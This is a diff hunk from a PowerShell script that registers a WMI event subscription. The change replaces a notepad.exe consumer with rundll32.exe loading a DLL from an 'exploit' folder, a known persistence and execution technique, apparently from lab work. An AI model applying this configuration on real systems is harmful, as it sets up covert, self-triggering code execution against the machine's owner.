@@ -10,8 +10,8 @@ $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscrip
 
 
 $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="WatchFolder2EmailConsumer";
-                 ExecutablePath = "C:\\Windows\\System32\\notepad.exe"
-                 CommandLineTemplate = "C:\\Windows\\System32\\notepad.exe"
+                 ExecutablePath = "C:\\Windows\\System32\\rundll32.exe"
+                 CommandLineTemplate = "C:\\Windows\\System32\\rundll32.exe c:\\users\\sunny\\exploit\\myfile.dll,main"
                 }
 
 
